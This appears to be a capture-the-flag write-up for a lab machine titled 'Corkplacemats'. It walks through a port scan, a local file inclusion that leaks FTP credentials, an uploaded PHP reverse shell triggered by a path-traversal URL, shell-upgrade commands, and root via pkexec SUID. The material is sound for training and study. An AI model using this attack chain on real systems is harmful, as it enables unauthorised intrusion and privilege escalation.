### Open Ports 
```bash
rustscan -a 10.10.203.169 -- -A

Open 10.10.203.169:22
Open 10.10.203.169:21
Open 10.10.203.169:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 60 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Jekyll v4.1.1
|_http-title: Corkplacemats
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
```

##### Identified CMS and version 
![[watcher1.png]]
From URL http://<machine_IP>/robots.txt
![[watcher2.png]]
##### LFI discovered
![[watcher3.png]]
Using the LFI read the content of secret_file_do_not_read.txt
![[watcher4.png]]
##### FTP credentials
ftpuser:givemefiles777
![[watcher5.png]]
#### RCE
Upload a php reverse shell in files folder
![[wathcer6.png]]
Open a listener in the receiving port and visit the following URL to get the shell 
http://<machine_ip>/post.php?post=../../../home/ftpuser/ftp/files/rev.php
![[watcher7.png]]
Now get the TTY shell using the following commands
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```

Using the following command I found that each user has one flag and the final flag is in /root directory.
```bash
find / -name "flag_*" -type f 2>/dev/null
```
![[watcher8.png]]

#### Privilege escalation
Using the SUID to pkexec get the root privilege.
![[watcher9.png]]
![[watcher10.png]]
Now retrieve all the flags.